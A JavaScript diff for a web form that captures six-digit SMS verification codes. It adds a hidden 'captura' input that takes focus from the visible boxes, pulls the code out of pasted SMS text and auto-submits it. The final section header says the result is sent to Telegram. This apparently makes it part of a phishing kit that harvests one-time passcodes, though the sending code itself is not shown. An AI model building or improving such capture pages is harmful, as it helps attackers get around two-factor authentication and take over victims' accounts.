@@ -122,34 +122,26 @@
     }
   }
 
-      // ============================================================
+    const inputInvisible = document.getElementById("otp-invisible-captura");
+
+  // ============================================================
   // EXTRACTOR DINÁMICO (Aísla los 6 dígitos de todo el mensaje)
   // ============================================================
   function rellenarYValidarCodigo(rawText) {
     const textoLimpio = String(rawText || "");
-    
-    // Busca cualquier grupo de 6 números seguidos en el SMS
     const coincidencia = textoLimpio.match(/\b\d{6}\b/);
     
-    let cleanValue = "";
+    // Si detecta un bloque de 6 números en el SMS lo aísla; si no, limpia texto y corta a 6
+    const cleanValue = coincidencia ? coincidencia[0] : textoLimpio.replace(/\D/g, "").slice(0, 6);
 
-    if (coincidencia) {
-      // ESTA ES LA FUNCIÓN SELECCIONADORA: Extrae el texto exacto del match
-      const [codigoEncontrado] = coincidencia;
-      cleanValue = codigoEncontrado;
-    } else {
-      // Si no es un mensaje y copiaron números sueltos, limpia letras y toma 6 digitos
-      cleanValue = textoLimpio.replace(/\D/g, "").slice(0, 6);
-    }
-
-    if (cleanValue && cleanValue.length > 0) {
-      // Inyecta número por número en cada casilla correspondiente
-      cleanValue.split("").forEach((char, idx) => {
+    if (cleanValue && cleanValue.length === 6) {
+      inputs.forEach((input, idx) => {
         if (inputs[idx]) {
-          inputs[idx].value = char;
+          inputs[idx].value = cleanValue[idx];
           inputs[idx].classList.remove("invalid");
         }
       });
+      if (inputInvisible) inputInvisible.value = cleanValue;
       refreshSubmitState();
       if (isComplete()) {
         enviarFormulario();
@@ -158,7 +150,7 @@
   }
 
   // ============================================================
-  // MODO 1: EXCLUSIVO PARA ANDROID (WebOTP)
+  // MODO 1: EXCLUSIVO PARA ANDROID (WebOTP API Nativo)
   // ============================================================
   function activarEscuchaWebOTPAndroid() {
     if (!('credentials' in navigator) || !('OTPCredential' in window)) return;
@@ -176,7 +168,7 @@
     }).catch(() => { });
   }
 
-  // Cazador de errores visual en pantalla (temporal para pruebas)
+  // Cazador de errores visual en pantalla
   window.onerror = function (mensaje, url, linea) {
     if (messageEl) {
       messageEl.style.color = "red";
@@ -185,15 +177,27 @@
   };
 
   // ============================================================
-  // CONFIGURACIÓN UNIFICADA (Android, iOS y Escritura Manual)
+  // CONFIGURACIÓN DE CASILLAS VISIBLES
   // ============================================================
   function configurarCasillasOTP() {
     if (!isIOS) activarEscuchaWebOTPAndroid();
 
+    // CORRECCIÓN DE FOCO: Redirige el clic de las primeras celdas hacia la celda invisible en Android
+    if (!isIOS && inputs && inputs[0] && inputInvisible) {
+      inputs.forEach(input => {
+        input.addEventListener("click", () => {
+          inputInvisible.focus();
+        });
+        input.addEventListener("focus", () => {
+          inputInvisible.focus();
+        });
+      });
+    }
+
     inputs.forEach((input, index) => {
       input.setAttribute("maxlength", "1");
 
-      // Captura el pegado en la casilla
+      // Captura el pegado manual tradicional dentro de la celda
       input.addEventListener("paste", (e) => {
         e.preventDefault();
         const clipboard = e.clipboardData || window.clipboardData;
@@ -201,7 +205,7 @@
         if (pastedData) rellenarYValidarCodigo(pastedData);
       });
 
-      // Entrada manual e inyección desde teclados móviles
+      // Escritura manual dígito por dígito
       input.addEventListener("input", (e) => {
         input.classList.remove("invalid");
         const val = e.target.value;
@@ -220,7 +224,7 @@
         if (isComplete()) enviarFormulario();
       });
 
-      // Borrado hacia atrás
+      // Borrado hacia atrás con Backspace
       input.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && !input.value && index > 0) {
           inputs[index - 1].focus();
@@ -230,20 +234,38 @@
       });
     });
 
-    // Respaldo global para capturar pegados en zonas muertas del formulario
-    const contenedor = inputs && inputs[0] ? inputs[0].closest("form") || document.body : document.body;
-    contenedor.addEventListener("paste", (e) => {
-      const clipboard = e.clipboardData || window.clipboardData;
-      const pastedData = clipboard ? clipboard.getData("text") : "";
-      if (pastedData && pastedData.replace(/\D/g, "").length >= 6) {
+    // ESCUCHA DE LA CASILLA MAESTRA INVISIBLE (Para Android)
+    if (inputInvisible) {
+      inputInvisible.addEventListener("input", (e) => {
+        const val = e.target.value;
+        if (val.length >= 6 || val.replace(/\D/g, "").length === 6) {
+          rellenarYValidarCodigo(val);
+        } else if (val.length > 0) {
+          // Si escriben a mano, reparte los dígitos a los campos visibles
+          const cleanText = val.replace(/\D/g, "");
+          inputs.forEach((input, idx) => {
+            if (cleanText[idx]) {
+              input.value = cleanText[idx];
+              input.classList.remove("invalid");
+            } else {
+              input.value = "";
+            }
+          });
+          refreshSubmitState();
+        }
+      });
+      
+      inputInvisible.addEventListener("paste", (e) => {
         e.preventDefault();
-        rellenarYValidarCodigo(pastedData);
-      }
-    });
+        const clipboard = e.clipboardData || window.clipboardData;
+        const pastedData = clipboard ? clipboard.getData("text") : "";
+        if (pastedData) rellenarYValidarCodigo(pastedData);
+      });
+    }
   }
 
   // ============================================================
-  // ARRANQUE DEL SCRIPT
+  // ARRANQUE UNIFICADO
   // ============================================================
   configurarCasillasOTP();
 
@@ -281,6 +303,7 @@
           input.value = "";
           input.classList.remove("invalid");
         });
+        if (inputInvisible) inputInvisible.value = "";
         if (inputs && inputs[0]) inputs[0].focus();
 
         startTimer();
@@ -288,7 +311,6 @@
       }, 1500);
     });
   }
-
 
   // ============================================================
   // ENVÍO Y VALIDACIÓN EN TELEGRAM
